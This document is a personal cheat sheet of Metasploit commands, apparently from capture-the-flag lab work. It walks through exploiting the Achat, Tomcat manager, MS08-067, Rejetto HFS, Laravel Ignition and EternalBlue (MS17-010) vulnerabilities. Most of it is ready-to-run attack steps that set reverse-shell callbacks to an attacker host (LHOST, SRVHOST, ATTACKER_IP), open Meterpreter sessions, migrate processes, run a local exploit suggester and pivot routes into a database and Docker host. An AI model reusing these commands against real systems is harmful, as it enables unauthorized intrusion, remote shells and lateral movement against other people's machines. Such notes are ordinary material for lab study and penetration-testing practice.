# --> The random commands I collected


## Get box with msfconsole

search achat

use explot/windows/misc/achat_bof

show options  

set RHOST 10.10.10.74  

set LHOST tun0  

set LPORT 9001

run

---
<br/>


## Simple Exploit

```
msfconsole
use multi/http/tomcat_mgr_upload
exploit
```


## Exploit and Open msfconsole

```
--> I used msfconsole for this one since I couldn't get shellcode to work, here is a high level of my commands:
search ms08_067_netapi  
show options  
set RHOST --> this is the remote host to attack
set LHOST --> this is your host for the call back
check --> this acutally checks to see if rhost is vulnerable
run
--metaterperater will load--
shell --> to open command shell
```


## MetaSploit Module Commands:

```
msfconsole

search rejetto

use exploit/windows/http/rejetto_hfs_exec

show options

set Proxies http:127.0.0.1:8080

set RHOST 10.10.10.8

set SRVHOST 10.10.14.31

set SRVPORT 8088

set ReverseAllProxy true

run

meterpreter sysinfo

migrate 1788 --> Process number

set payload
```

## Msploit exploit suggester

search suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run


## Hack a Web Server in a docker image, then pivot to the DB and host

```

use multi/php/ignition_laravel_debug_rce
check rhost=10.10.234.246 HttpClientTimeout=20
run rhost=10.10.234.246 lhost=ATTACKER_IP HttpClientTimeout=20
## At this point you will a basic shell
background
sessions
sessions -u -1
sessions
sessions -i -1
# At this point you will be loggecd into a Meterpreter session
resolve webservice_database
background
# Database IP
route add 172.28.101.51/32 -1
# Host IP
route add 172.17.0.1/32 -1
route print
# SSH inot host
use auxiliary/scanner/ssh/ssh_login
run ssh://USER:PASSWORD@172.17.0.1
sessions
# You should now see your ssh session
# Login to ssh session
sessions -i -1

```

## Search to see if Vulnerable and then exploit

```
search smb
grep scanner search smb
use auxiliary/scanner/smb/smb_ms17_010
show options
run


grep exploit search smb
use exploit/windows/smb/ms17_010_psexec
show options
set
set payload windows/meterpreter/reverse_http
set LHOSTS
exploit

```